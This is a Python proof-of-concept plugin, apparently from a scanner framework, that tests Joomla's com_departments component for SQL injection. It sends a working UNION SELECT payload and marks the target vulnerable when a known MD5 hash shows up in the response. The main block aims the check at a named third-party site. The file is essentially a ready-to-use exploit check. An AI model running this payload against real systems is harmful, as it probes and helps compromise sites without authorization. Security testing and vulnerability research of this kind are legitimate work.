#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  joomla Component com_departments插件 SQL注入漏洞
References: http://sebug.net/vuldb/ssvid-19358
Author    :  ko0zhi
"""
from ..miniCurl import Curl
from ..t  import T


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = 'index.php?option=com_departments&id=-1%20UNION%20SELECT%201,md5(3.1415),3,4,5,6,7,8--%20'
        url = arg + payload
        code, head, res, errcode, _ = curl.curl('"%s"' % url)
        if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
            output(url,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_51d1fd5443079bb9e0ef6549fa56f24b.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_51d1fd5443079bb9e0ef6549fa56f24b.py
#/root/github/poccreate/codesrc/exp-561.py